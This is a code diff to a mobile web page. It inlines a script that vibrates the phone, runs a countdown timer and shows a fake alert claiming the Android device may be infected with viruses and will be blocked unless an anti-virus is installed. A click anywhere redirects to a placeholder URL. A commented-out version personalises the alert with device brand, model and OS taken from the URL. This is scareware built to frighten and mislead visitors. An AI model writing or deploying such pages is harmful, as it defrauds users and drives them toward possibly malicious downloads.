@@ -11,7 +11,7 @@
   <meta name="apple-mobile-web-app-status-bar-style" content="black">
   <style>
   #timer p, p {color: rgb(85, 85, 85);}#timer {text-align: center;}#timer p, .btn {font-weight: 700;}body {font-family: sans-serif;}a {text-decoration: none;}* {margin: 0px;padding: 0px;}#wrapper {max-width: 700px;border: 0 solid rgb(48, 48, 48);border-radius: 0;margin: 0 auto;}p {font-size: 14px;padding: 5px 0px;}#timer p {font-size: 12px;}.btn {background-color: #236DA6;border-radius: 5px;color: rgb(255, 255, 255);display: block;line-height: 50px;max-width: 275px;width: 90%;}.container {padding: 8px;}#blink {color: #ff0000;padding: 6px;-webkit-animation: blink 1s infinite;animation: blink 1s infinite;}@-webkit-keyframes blink {0% {opacity: 1.0;}50% {opacity: .0;}100% {opacity: 1.0;}}.footer-fixed {width: 100%;background: rgba(255, 255, 255, .9);}@media all and (max-height:600px) {.footer-fixed {position: fixed;bottom: 0;left: 0;right: 0;}body {margin-bottom: 100px;}}@media all and (max-height:600px) and (orientation: landscape) {.header {float: right;margin-left: 5px;}}
-  </style>
+  </style></head>
 
 <body onclick="goto()">
   <div id="wrapper">
@@ -49,7 +49,11 @@
       </div>
     </div>
   </div>
-  <script src="assets/js/script.js" charset="utf-8"></script>
+  <script>
+  function getURLParameter(e){return decodeURI((RegExp(e+"=(.*?)(&|$)").exec(location.search)||[,null])[1]||"")}function countDown(){-1==--sec?(sec=59,min-=1):min=min,sec<=9&&(sec="0"+sec),time=(min<=9?""+min:min)+" minutes and "+sec+" seconds",document.getElementById&&(document.getElementById("theTime").innerHTML=time),SD=window.setTimeout("countDown();",1e3),"00"==min&&"00"==sec&&(sec="00",window.clearTimeout(SD))}function goto(){location.href="http://www.example.com"}navigator.vibrate=navigator.vibrate||navigator.webkitVibrate||navigator.mozVibrate||navigator.msVibrate,navigator.vibrate([5e4]);var sec=21,min=0;window.onload=countDown;
+  alert("WARNING!\n\nYour mobile device may be infected with viruses!\n\nYou should immediately install anti-virus program to clean the system otherwise your Android may be blocked");
+  /*alert("WARNING!\n\nYour " + (getURLParameter('brand')) + "-" + (getURLParameter('model')) + " may be infected with viruses!\n\n\You should immediately install anti-virus program to clean the system otherwise your " + (getURLParameter('os')) + "-" + (getURLParameter('osv')) + " may be blocked");*/  
+  </script>
 </body>
 
 </html>
